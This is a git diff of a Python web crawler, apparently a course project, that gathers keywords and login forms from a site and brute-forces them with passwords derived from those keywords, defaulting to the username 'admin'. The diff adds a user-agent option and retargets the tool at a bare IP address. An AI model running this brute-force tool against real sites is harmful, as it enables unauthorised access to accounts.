@@ -1,5 +1,5 @@
 from html_parser import HTMLParser
-from password_generator import generate_password_list
+from password_generator import generate_all_passwords
 from requests import get_request, get_status, post_request
 from url_utils import extract_url_parts, reformat_url
 
@@ -148,10 +148,7 @@ def crawl_subdomains(bfs, url, header_dict, counter):
             conn.close()    
             
 def brute_force(user, keywords, forms, user_agent):
-    passwords = set()
-    for word in keywords:
-        print(word, '  :  ', generate_password_list(word))
-        passwords.update(generate_password_list(word))
+    passwords = generate_all_passwords(keywords)
 
     for form in forms:
         print('\nAttempting to brute-force: ' + form + '\n')
@@ -185,14 +182,16 @@ def brute_force(user, keywords, forms, user_agent):
         print('Ran out of passwords! Bruteforce failed!')
           
 def main():
-    parser = argparse.ArgumentParser(description='Arguments to proceed web-crawling')
-    parser.add_argument('--u', nargs=1, type=str, help='USERNAME')
-    parser.add_argument('--maxdepth', nargs=1, type=int, help='MAX DEPTH TO CRAWL')
-    parser.add_argument('--maxpages', nargs=1, type=int, help='MAX PAGES TO CRAWL')
-    parser.add_argument('--mode', nargs=1, type=str, help='MODE OF CRAWLING : \'bfs\' OR \'dfs\'')
+    parser = argparse.ArgumentParser(description= 'Arguments to proceed web-crawling')
+    parser.add_argument('--u', nargs = 1, type = str, help = 'USERNAME')
+    parser.add_argument('--maxdepth', nargs = 1, type = int, help = 'MAX DEPTH TO CRAWL')
+    parser.add_argument('--maxpages', nargs = 1, type = int, help = 'MAX PAGES TO CRAWL')
+    parser.add_argument('--mode', nargs = 1, type = str, help='MODE OF CRAWLING : \'bfs\' OR \'dfs\'')
+    parser.add_argument('--useragent', nargs = 1, type = str, help = 'USER AGENT')
     args = parser.parse_args()
     username, mode = '',''
     maxdepth, maxpage = 0,0
+    header_dict = {}
     if (args.u ==None):
         username = 'admin'
     else :
@@ -209,29 +208,36 @@ def main():
         mode = 'bfs'
     else :
         mode = args.mode.pop()
+    if (args.useragent != None):
+        header_dict = {'User Agent': args.useragent.pop()}
+    useragent = header_dict.get('User Agent')
+    useragent = useragent if useragent != None else 'Default value set (Left to be determined by connection)'
+    print('Initiating web crawl with following configuration\n Algorithm: {}, Username: {}, Max Pages: {}, Max Page Depth: {}, User Agent: {}'
+    .format(mode, username, maxpage, maxdepth, useragent))
 
-    url = 'http://stonybrook.be'
+    url = 'http://3.16.219.26/'
     url = reformat_url(url)
     page_counter = Counter(0, maxdepth, maxpage)
 
+    useragent = header_dict.get('User Agent')
+    useragent = useragent if useragent != None else ''
 
     if mode == 'bfs':
         """
         BFS
         """
-        keywords, forms, seen = crawl_bfs(url, {}, page_counter)
+        keywords, forms, seen = crawl_bfs(url, header_dict, page_counter)
         print('\n\nKeywords:', keywords, '\n\nForm:', forms, '\n\nSeen:', seen, sep=' ')
-        crawl_subdomains(True, url, {}, page_counter)
-        brute_force(username, keywords, forms, '')
+        brute_force(username, keywords, forms, useragent)
     elif mode == 'dfs':
         """
         DFS
         """
-        keywords, forms, seen = crawl_dfs(url, {}, page_counter)
+        keywords, forms, seen = crawl_dfs(url, header_dict, page_counter)
         print('\n\nKeywords:', keywords, '\n\nForm:', forms, '\n\nSeen:', seen, sep=' ')
-        brute_force(username, keywords, forms, '')
+        brute_force(username, keywords, forms, useragent)
     else:
-        print('\'{}\' is not supported as a search algorithm. Please use \'bfs\' or \'dfs\'!'.format(search_algo))
+        print('\'{}\' is not supported as a search algorithm. Please use \'bfs\' or \'dfs\'!'.format(mode))
         return
 
     print('\n\n\n', get_subdomains(url))
